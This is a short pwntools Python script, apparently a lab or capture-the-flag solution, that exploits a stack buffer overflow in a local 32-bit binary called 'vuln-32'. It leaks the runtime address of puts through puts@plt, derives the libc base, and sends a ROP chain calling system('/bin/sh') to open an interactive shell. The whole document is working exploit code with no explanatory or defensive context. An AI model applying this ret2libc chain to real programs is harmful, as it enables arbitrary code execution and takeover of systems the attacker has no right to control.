from pwn import *

context(os='linux', arch='i386')
p = process('./vuln-32')

elf = ELF('./vuln-32')
libc = elf.libc


puts_got = elf.got['puts'] #puts@plt 
puts_plt = elf.plt['puts'] #argument for puts@plt function
main = elf.sym['main'] #return address after puts function 
payload = b'A'*18 + p32(puts_plt) + p32(main) + p32(puts_got)

p.sendline(payload)
p.readline()
data_recv = p.readline()
leaked_address = u32(data_recv[:-1])

libc.address = leaked_address - libc.sym['puts']

rop = ROP(libc)
rop.raw("A"*18)
payload = b"A"*18 + b'\x90'*8
rop.raw(rop.ret)
rop.system(next(libc.search(b"/bin/sh")))
p.sendline(rop.chain())


p.interactive()